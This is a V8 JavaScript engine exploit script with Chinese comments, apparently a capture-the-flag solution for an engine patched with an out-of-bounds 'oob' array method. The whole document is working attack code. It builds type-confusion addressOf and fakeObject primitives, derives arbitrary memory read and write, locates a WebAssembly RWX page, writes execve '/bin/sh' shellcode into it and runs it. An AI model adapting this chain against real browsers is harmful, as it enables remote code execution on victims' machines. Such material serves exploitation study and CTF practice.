```bash
// ××××××××1. 无符号64位整数和64位浮点数的转换代码××××××××
var buf = new ArrayBuffer(16);
var float64 = new Float64Array(buf);
var bigUint64 = new BigUint64Array(buf);
// 浮点数转换为64位无符号整数
function f2i(f)
{
    float64[0] = f;
    return bigUint64[0];
}
// 64位无符号整数转为浮点数
function i2f(i)
{
    bigUint64[0] = i;
    return float64[0];
}
// 64位无符号整数转为16进制字节串
function hex(i)
{
    return i.toString(16).padStart(16, "0");
}
// ××××××××2. addressOf和fakeObject的实现××××××××
var obj = {"a": 1};
var obj_array = [obj];
var float_array = [1.1];
var obj_array_map = obj_array.oob();//oob函数出来的就是map
var float_array_map = float_array.oob();

// 泄露某个object的地址
function addressOf(obj_to_leak)
{
    obj_array[0] = obj_to_leak;
    obj_array.oob(float_array_map);
    let obj_addr = f2i(obj_array[0]) - 1n;//泄漏出来的地址-1才是真实地址
    obj_array.oob(obj_array_map); // 还原array类型以便后续继续使用
    return obj_addr;
}
function fakeObject(addr_to_fake)
{
    float_array[0] = i2f(addr_to_fake + 1n);//地址需要+1才是v8中的正确表达方式
    float_array.oob(obj_array_map);
    let faked_obj = float_array[0];
    float_array.oob(float_array_map); // 还原array类型以便后续继续使用
    return faked_obj;
}
// ××××××××3.read & write anywhere××××××××
// 这是一块我们可以控制的内存
var fake_array = [                //伪造一个对象
    float_array_map,
    i2f(0n),
    i2f(0x41414141n),// fake obj's elements ptr
    i2f(0x1000000000n),
    1.1,
    2.2,
];

// 获取到这块内存的地址
var fake_array_addr = addressOf(fake_array);
// 将可控内存转换为对象
var fake_object_addr = fake_array_addr - 0x30n;
var fake_object = fakeObject(fake_object_addr);
// 任意地址读
function read64(addr)
{
    fake_array[2] = i2f(addr - 0x10n + 0x1n);
    let leak_data = f2i(fake_object[0]);
    return leak_data;
}
// 任意地址写
function write64(addr, data)
{
    fake_array[2] = i2f(addr - 0x10n + 0x1n);
    fake_object[0] = i2f(data);    
}
var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);

var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule, {});
var f = wasmInstance.exports.main;
var f_addr = addressOf(f);
console.log("[*] leak wasm_func_addr: 0x" + hex(f_addr));

var shared_info_addr = read64(f_addr + 0x18n) - 0x1n;
var wasm_exported_func_data_addr = read64(shared_info_addr + 0x8n) - 0x1n;
var wasm_instance_addr = read64(wasm_exported_func_data_addr + 0x10n) - 0x1n;
var rwx_page_addr = read64(wasm_instance_addr + 0x88n);
console.log("[*] leak rwx_page_addr: 0x" + hex(rwx_page_addr));

var shellcode=[
0x6e69622fbb48f631n,
0x5f54535668732f2fn,
0x050fd231583b6an
    ];

var data_buf = new ArrayBuffer(24);
var data_view = new DataView(data_buf);
var buf_backing_store_addr = addressOf(data_buf) + 0x20n;

write64(buf_backing_store_addr, rwx_page_addr);  //这里写入之前泄露的rwx_page_addr地址
for (var i = 0; i < shellcode.length; i++)
    data_view.setBigUint64(8*i, shellcode[i], true);
f();
```
